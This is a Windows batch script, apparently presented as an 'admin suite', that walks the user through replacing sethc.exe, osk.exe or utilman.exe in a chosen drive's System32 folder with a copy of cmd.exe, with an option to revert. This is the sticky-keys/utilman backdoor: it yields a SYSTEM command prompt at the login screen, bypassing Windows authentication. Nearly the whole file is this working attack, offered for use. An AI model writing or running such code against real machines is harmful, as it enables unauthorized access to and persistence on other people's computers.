@echo off
cls
color a
echo -----------------------------------
echo I     Windows Admin Suite v1.2    I
echo I       Developed by 101sec       I
echo I         WhiteHoodHacker         I
echo I           myLemonLime           I
echo -----------------------------------
echo.
pause
goto 1

:1
echo  [1] Choose which program to perform action:
echo      (s) sethc.exe    *Recommended
echo      (o) osk.exe      *Most secure
echo      (u) utilman.exe  *Least secure
echo.
set /p inputProgram=: 
if %inputProgram%==s goto sethc
if %inputProgram%==sethc goto sethc
if %inputProgram%==sethc.exe goto sethc
if %inputProgram%==o goto osk
if %inputProgram%==osk goto osk
if %inputProgram%==osk.exe goto osk
if %inputProgram%==u set goto utilman
if %inputProgram%==utilman goto utilman
if %inputProgram%==utilman.exe goto utilman
goto invalidInputProgram

:2
echo  [2] Choose which disk (containing Windows) to perform action:
echo      (Drives are listed below.)
echo      (Enter drive letter to select.)
wmic logicaldisk get caption,description,drivetype,volumename
echo.
set /p disk=%selectedProgram%: 
if %disk%==A set selectedDisk=A:
if %disk%==B set selectedDisk=B:
if %disk%==C set selectedDisk=C:
if %disk%==D set selectedDisk=D:
if %disk%==E set selectedDisk=E:
if %disk%==F set selectedDisk=F:
if %disk%==G set selectedDisk=G:
if %disk%==H set selectedDisk=H:
if %disk%==I set selectedDisk=I:
if %disk%==J set selectedDisk=J:
if %disk%==K set selectedDisk=K:
if %disk%==L set selectedDisk=L:
if %disk%==M set selectedDisk=M:
if %disk%==N set selectedDisk=N:
if %disk%==O set selectedDisk=O:
if %disk%==P set selectedDisk=P:
if %disk%==Q set selectedDisk=Q:
if %disk%==R set selectedDisk=R:
if %disk%==S set selectedDisk=S:
if %disk%==T set selectedDisk=T:
if %disk%==U set selectedDisk=U:
if %disk%==V set selectedDisk=V:
if %disk%==W set selectedDisk=W:
if %disk%==X set selectedDisk=X:
if %disk%==Y set selectedDisk=Y:
if %disk%==Z set selectedDisk=Z:
if %disk%==a set selectedDisk=A:
if %disk%==b set selectedDisk=B:
if %disk%==c set selectedDisk=C:
if %disk%==d set selectedDisk=D:
if %disk%==e set selectedDisk=E:
if %disk%==f set selectedDisk=F:
if %disk%==g set selectedDisk=G:
if %disk%==h set selectedDisk=H:
if %disk%==i set selectedDisk=I:
if %disk%==j set selectedDisk=J:
if %disk%==k set selectedDisk=K:
if %disk%==l set selectedDisk=L:
if %disk%==m set selectedDisk=M:
if %disk%==n set selectedDisk=N:
if %disk%==o set selectedDisk=O:
if %disk%==p set selectedDisk=P:
if %disk%==q set selectedDisk=Q:
if %disk%==r set selectedDisk=R:
if %disk%==s set selectedDisk=S:
if %disk%==t set selectedDisk=T:
if %disk%==u set selectedDisk=U:
if %disk%==v set selectedDisk=V:
if %disk%==w set selectedDisk=W:
if %disk%==x set selectedDisk=X:
if %disk%==y set selectedDisk=Y:
if %disk%==z set selectedDisk=Z:
goto 3

:3
echo.
echo  [3] Choose configuration:
echo      (a) Apply (copy cmd.exe to %selectedProgram%)
echo      (r) Revert (change %selectedProgram% back to normal)
echo.
set /p configuration=%selectedProgram%\%selectedDisk%: 
if %configuration%==a goto executeCommandApply
if %configuration%==A goto executeCommandApply
if %configuration%==r goto executeCommandRevertConfirm
if %configuration%==R goto executeCommandRevertConfirm

:executeCommandApply
%selectedDisk%
cd Windows\System32
move %selectedProgram% %selectedProgram%.backup.exe
copy cmd.exe %selectedProgram%
echo.
echo  [+] If all commands have successfully completed, the action succeeded!
echo.
pause
exit

:executeCommandRevertConfirm
echo.
color c
echo  [*] Are you sure? (Y/N):
echo.
set /p confirm=%selectedProgram%\%selectedDisk%\Revert: 
if %confirm%==y goto executeCommandRevert
if %confirm%==Y goto executeCommandRevert
if %confirm%==n exit
if %confirm%==N exit

:executeCommandRevert
color a
%selectedDisk%
cd Windows\System32
del %selectedProgram%
move %selectedProgram%.backup.exe %selectedProgram%
echo.
echo  [+] If all commands have successfully completed, the action succeeded!
echo.
pause
exit

:sethc
set selectedProgram=sethc.exe
echo.
echo  [+] You have selected "sethc.exe"
echo.
goto 2

:osk
set selectedProgram=osk.exe
echo.
echo  [+] You have selected "osk.exe"
echo.
goto 2

:utilman
set selectedProgram=utilman.exe
echo.
echo  [+] You have selected "utilman.exe"
echo.
goto 2

:invalidInputProgram
echo.
echo  [-] Invalid program name. Please try again:
echo.
goto 1